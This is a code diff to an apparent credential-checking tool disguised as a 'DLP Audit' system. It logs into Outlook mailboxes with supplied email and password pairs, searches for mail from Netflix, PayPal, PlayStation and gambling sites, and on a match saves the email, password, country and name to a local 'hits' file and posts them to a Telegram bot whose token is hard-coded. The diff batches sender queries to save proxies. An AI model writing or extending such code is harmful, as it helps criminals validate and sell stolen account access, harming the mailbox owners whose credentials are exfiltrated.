@@ -458,17 +458,21 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 senders_list = [s.strip() for s in d_senders.split(',') if s.strip()]
                 if not senders_list: continue
                 
-                # OPTIMIZATION: Combine all senders with OR to save proxies
-                or_query = " OR ".join([f"from:{s}" for s in senders_list])
-                final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
-                
-                searches_to_run.append({
-                    "username": d_uname,
-                    "chat_id": d_chat_id,
-                    "query": final_q,
-                    "label": "MIS REMITENTES" if len(senders_list) > 1 else senders_list[0],
-                    "is_multi": True
-                })
+                # OPTIMIZATION: Combine senders in batches of 10
+                chunk_size = 10
+                for i in range(0, len(senders_list), chunk_size):
+                    chunk = senders_list[i:i+chunk_size]
+                    or_query = " OR ".join([f"from:{s}" for s in chunk])
+                    final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
+                    
+                    searches_to_run.append({
+                        "username": d_uname,
+                        "chat_id": d_chat_id,
+                        "query": final_q,
+                        "label": chunk[0] if len(chunk) == 1 else "BATCH",
+                        "is_multi": True,
+                        "chunk": chunk
+                    })
         except Exception as e:
             emit_event(q, "warning", {"message": f"Error fetching db users: {e}"})
         finally:
@@ -479,38 +483,39 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
         if sender:
             senders_list = [s.strip() for s in sender.split(',') if s.strip()]
             if senders_list:
-                # OPTIMIZATION: Combine all senders with OR to save proxies
-                or_query = " OR ".join([f"from:{s}" for s in senders_list])
-                final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
-                
-                searches_to_run.append({
-                    "username": "Local Dashboard",
-                    "chat_id": tg_chat_id,
-                    "query": final_q,
-                    "label": "MIS REMITENTES" if len(senders_list) > 1 else senders_list[0],
-                    "is_multi": False
-                })
+                # OPTIMIZATION: Combine senders in batches of 10
+                chunk_size = 10
+                for i in range(0, len(senders_list), chunk_size):
+                    chunk = senders_list[i:i+chunk_size]
+                    or_query = " OR ".join([f"from:{s}" for s in chunk])
+                    final_q = f'({or_query}) "{keyword}"' if keyword else f'({or_query})'
+                    
+                    searches_to_run.append({
+                        "username": "Local Dashboard",
+                        "chat_id": tg_chat_id,
+                        "query": final_q,
+                        "label": chunk[0] if len(chunk) == 1 else "BATCH",
+                        "is_multi": False,
+                        "chunk": chunk
+                    })
         else:
             searches_to_run.append({
                 "username": "Local Dashboard",
                 "chat_id": tg_chat_id,
                 "query": keyword,
                 "label": keyword,
-                "is_multi": False
+                "is_multi": False,
+                "chunk": []
             })
         
     global_classification = "CLEAN"
 
-    for search_task in searches_to_run:
-        target_username = search_task["username"]
-        target_chat_id = search_task["chat_id"]
-        search_q = search_task["query"]
-        target_label = search_task["label"]
-
-        emit_event(q, "step_start", {"step": 7, "name": f"Búsqueda: {search_q[:30]} ({target_username})"})
-        emit_event(q, "info", {"message": f'Query [{target_username}]: "{search_q}"'})
+    def run_outlook_search(query_string, username, is_silent=False):
+        if not is_silent:
+            emit_event(q, "step_start", {"step": 7, "name": f"Búsqueda: {query_string[:30]} ({username})"})
+            emit_event(q, "info", {"message": f'Query [{username}]: "{query_string}"'})
         time.sleep(0.2)
-
+        
         search_payload = {
             "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
             "Scenario": {"Name": "owa.react"},
@@ -526,7 +531,7 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                     ]
                 },
                 "From": 0,
-                "Query": {"QueryString": search_q},
+                "Query": {"QueryString": query_string},
                 "RefiningQueries": None,
                 "Size": 25,
                 "Sort": [
@@ -537,7 +542,7 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 "TopResultsCount": 3
             }],
             "AnswerEntityRequests": [{
-                "Query": {"QueryString": search_q},
+                "Query": {"QueryString": query_string},
                 "EntityTypes": ["Event", "File"],
                 "From": 0,
                 "Size": 100,
@@ -557,8 +562,8 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
             "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c"
         }
 
-        total_found = 0
-        search_ok = False
+        t_found = 0
+        s_ok = False
 
         try:
             res_search = session.post(
@@ -566,25 +571,18 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 json=search_payload, headers=api_headers,
                 verify=False, timeout=20
             )
-            emit_event(q, "info", {"message": f"Search HTTP: {res_search.status_code}"})
+
+            if not is_silent:
+                emit_event(q, "info", {"message": f"Search HTTP: {res_search.status_code}"})
 
             if res_search.status_code == 200:
                 data = res_search.json()
-                
-                raw_str = json.dumps(data, indent=2)
-                if len(raw_str) > 1000:
-                    emit_event(q, "info", {"message": f"Raw Search JSON: {raw_str[:1000]}... [TRUNCATED]"})
-                else:
-                    emit_event(q, "info", {"message": f"Raw Search JSON: {raw_str}"})
-
-                # Extract total from EntityResponses first (Standard location)
                 for er in data.get("EntityResponses", []):
                     if er.get("EntityType") == "Conversation":
-                        total_found = er.get("Total", 0)
+                        t_found = er.get("Total", 0)
                         break
                         
-                if total_found == 0:
-                    # Recursive function to find the 'Total' key
+                if t_found == 0:
                     def find_total(obj):
                         if isinstance(obj, dict):
                             if "Total" in obj and isinstance(obj["Total"], int):
@@ -602,104 +600,125 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
 
                     found = find_total(data)
                     if found is not None:
-                        total_found = found
+                        t_found = found
                     else:
                         for es in data.get("EntitySets", []):
                             for rs in es.get("ResultSets", []):
                                 results_list = rs.get("Results", [])
-                                total_found += len(results_list)
-
-                search_ok = True
+                                t_found += len(results_list)
+                s_ok = True
             elif res_search.status_code == 401:
-                emit_event(q, "warning", {"message": f"401 — token sin permiso [{target_username}]"})
+                emit_event(q, "warning", {"message": f"401 — token sin permiso [{username}]"})
             else:
-                emit_event(q, "warning", {"message": f"Search HTTP {res_search.status_code} [{target_username}]"})
+                emit_event(q, "warning", {"message": f"Search HTTP {res_search.status_code} [{username}]"})
         except Exception as e:
-            emit_event(q, "warning", {"message": f"Search error [{target_username}]: {str(e)[:80]}"})
-
-        if search_ok:
-            emit_event(q, "step_pass", {"step": 7, "detail": f"{total_found} msgs — {target_label} ({target_username})"})
-            emit_event(q, "dlp_result", {"total": total_found, "keyword": search_q, "sender": target_label})
+            emit_event(q, "warning", {"message": f"Search error [{username}]: {str(e)[:80]}"})
             
-            if total_found > 0:
-                global_classification = "HIT"
-                emit_event(q, "warning", {"message": f"🚨 {total_found} msgs encontrados: {search_q}"})
-                
-                # --- GATE / GUARDADO LOCAL ---
-                try:
-                    gate_filename = "hits_encontrados.txt"
-                    with open(gate_filename, "a", encoding="utf-8") as gf:
-                        gf.write("="*40 + "\n")
-                        gf.write(f"🎯 ALERTA MULTI-USER: Destinado para {target_username}\n")
-                        gf.write(f"🎯 OBJETIVO: {search_q}\n")
-                        gf.write(f"📧 Correo: {email}\n")
-                        gf.write(f"🔑 Pass: {password}\n")
-                        gf.write(f"🌍 País: {country} | Nombre: {name}\n")
-                        gf.write(f"📊 Total Encontrados: {total_found}\n")
-                        gf.write("="*40 + "\n\n")
-                    emit_event(q, "info", {"message": f"💾 Gate guardado en {gate_filename}"})
-                except Exception as e:
-                    emit_event(q, "warning", {"message": f"Error guardando gate: {e}"})
+        return t_found, s_ok
 
-                # --- TELEGRAM INTEGRATION ---
-                TELEGRAM_BOT_TOKEN = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
-                
-                if TELEGRAM_BOT_TOKEN and target_chat_id:
-                    # Friendly name mapping
-                    friendly_names = {
-                        "info@account.netflix.com": "NETFLIX 🎬",
-                        "no_reply@vip.codere.com": "CODERE 🎰",
-                        "no-reply@mailer.caliente.mx": "CALIENTE 🔥",
-                        "noreply@zilch.com": "ZILCH 💳",
-                        "service@intl.paypal.com": "PAYPAL 💰",
-                        "reply@txn-email.playstation.com": "PLAYSTATION 🎮"
-                    }
-                    display_match = friendly_names.get(target_label.lower(), target_label)
+    def process_hit(chat_id, uname, s_label, s_query, t_found):
+        nonlocal global_classification
+        global_classification = "HIT"
+        emit_event(q, "step_pass", {"step": 7, "detail": f"{t_found} msgs — {s_label} ({uname})"})
+        emit_event(q, "dlp_result", {"total": t_found, "keyword": s_query, "sender": s_label})
+        emit_event(q, "warning", {"message": f"🚨 {t_found} msgs encontrados: {s_query}"})
+        
+        try:
+            gate_filename = "hits_encontrados.txt"
+            with open(gate_filename, "a", encoding="utf-8") as gf:
+                gf.write("="*40 + "\
+")
+                gf.write(f"🎯 ALERTA MULTI-USER: Destinado para {uname}\
+")
+                gf.write(f"🎯 OBJETIVO: {s_query}\
+")
+                gf.write(f"📧 Correo: {email}\
+")
+                gf.write(f"🔑 Pass: {password}\
+")
+                gf.write(f"🌍 País: {country} | Nombre: {name}\
+")
+                gf.write(f"📊 Total Encontrados: {t_found}\
+")
+                gf.write("="*40 + "\
+\
+")
+            emit_event(q, "info", {"message": f"💾 Gate guardado en {gate_filename}"})
+        except Exception as e:
+            emit_event(q, "warning", {"message": f"Error guardando gate: {e}"})
 
-                    if hit_buffer is not None:
-                        # Batching mode: Add to buffer and skip direct Telegram
-                        hit_buffer.append({
-                            "user": target_username,
-                            "match": display_match,
-                            "email": email,
-                            "pass": password,
-                            "country": country,
-                            "name": name,
-                            "total": total_found,
-                            "query": search_q,
-                            "chat_id": target_chat_id
-                        })
-                        emit_event(q, "info", {"message": f"📦 HIT recolectado para reporte grupal ({display_match})"})
-                    else:
-                        # Individual mode: Send to Telegram immediately
-                        try:
-                            tg_msg = (
-                                f"📣 *¡OBJETIVO DETECTADO! (HIT)* 🎯\n"
-                                f"━━━━━━━━━━━━━━━━━━\n\n"
-                                f"👤 *Usuario:* `{target_username}`\n"
-                                f"✅ *Match:* `{display_match}`\n\n"
-                                f"📧 *Correo:* `{email}`\n"
-                                f"🔑 *Pass:* `{password}`\n\n"
-                                f"🌍 *País:* {country}\n"
-                                f"👤 *Nombre:* {name}\n"
-                                f"📊 *Mensajes:* `{total_found}`\n\n"
-                                f"🔍 *Búsqueda:* `{search_q}`\n"
-                                f"🤖 *DLP Audit Pro System*"
-                            )
-                            
-                            tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-                            http_requests.post(tg_url, json={
-                                "chat_id": target_chat_id,
-                                "text": tg_msg,
-                                "parse_mode": "Markdown"
-                            }, timeout=5)
-                            emit_event(q, "info", {"message": f"✅ Alerta enviada a Telegram de {target_username}"})
-                        except Exception as e:
-                            emit_event(q, "warning", {"message": f"⚠️ Error enviando a Telegram: {str(e)[:50]}"})
+        TELEGRAM_BOT_TOKEN = "8741495811:AAEOFBaW9QfFOpVWfW6kyogJskS7y4wVTIs"
+        if TELEGRAM_BOT_TOKEN and chat_id:
+            friendly_names = {
+                "info@account.netflix.com": "NETFLIX 🎬",
+                "no_reply@vip.codere.com": "CODERE 🎰",
+                "no-reply@mailer.caliente.mx": "CALIENTE 🔥",
+                "noreply@zilch.com": "ZILCH 💳",
+                "service@intl.paypal.com": "PAYPAL 💰",
+                "reply@txn-email.playstation.com": "PLAYSTATION 🎮"
+            }
+            display_match = friendly_names.get(s_label.lower(), s_label)
+            
+            if hit_buffer is not None:
+                hit_buffer.append({
+                    "user": uname,
+                    "match": display_match,
+                    "email": email,
+                    "pass": password,
+                    "country": country,
+                    "name": name,
+                    "total": t_found,
+                    "query": s_query,
+                    "chat_id": chat_id
+                })
+                emit_event(q, "info", {"message": f"📦 HIT recolectado para reporte individual ({display_match})"})
             else:
-                emit_event(q, "info", {"message": f"✅ 0 mensajes — inbox limpio ({target_username})"})
+                try:
+                    tg_msg = (f"📣 *¡OBJETIVO DETECTADO! (HIT)* 🎯\
+━━━━━━━━━━━━━━━━━━\
+\
+"
+                              f"👤 *Usuario:* `{uname}`\
+✅ *Match:* `{display_match}`\
+\
+"
+                              f"📧 *Correo:* `{email}`\
+🔑 *Pass:* `{password}`\
+"
+                              f"🌍 *País:* {country}\
+👤 *Nombre:* {name}\
+"
+                              f"📊 *Mensajes:* `{t_found}`\
+🔍 *Búsqueda:* `{s_query}`\
+"
+                              f"🤖 *DLP Audit Pro System*")
+                    tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+                    http_requests.post(tg_url, json={"chat_id": chat_id, "text": tg_msg, "parse_mode": "Markdown"}, timeout=5)
+                    emit_event(q, "info", {"message": f"✅ Alerta enviada a Telegram de {uname}"})
+                except Exception as e:
+                    emit_event(q, "warning", {"message": f"⚠️ Error enviando a Telegram: {str(e)[:50]}"})
+
+    for search_task in searches_to_run:
+        target_username = search_task["username"]
+        target_chat_id = search_task["chat_id"]
+        search_q = search_task["query"]
+        chunk = search_task.get("chunk", [])
+        
+        t_batch, s_ok = run_outlook_search(search_q, target_username, is_silent=False)
+        
+        if t_batch > 0:
+            if chunk and len(chunk) > 1:
+                emit_event(q, "info", {"message": f"🔍 {t_batch} detectados en grupo. Analizando individualmente para conteo exacto..."})
+                for s in chunk:
+                    indiv_q = f'from:{s} "{keyword}"' if keyword else f'from:{s}'
+                    i_total, i_ok = run_outlook_search(indiv_q, target_username, is_silent=True)
+                    if i_total > 0:
+                        process_hit(target_chat_id, target_username, s, indiv_q, i_total)
+            else:
+                t_label = chunk[0] if chunk else search_task["label"]
+                process_hit(target_chat_id, target_username, t_label, search_q, t_batch)
         else:
-            emit_event(q, "step_warn", {"step": 7, "detail": f"Búsqueda sin resultado ({target_username})"})
+            emit_event(q, "info", {"message": f"✅ 0 mensajes — inbox limpio ({target_username})"})
 
     emit_event(q, "done", {"classification": global_classification, "email": email})
 
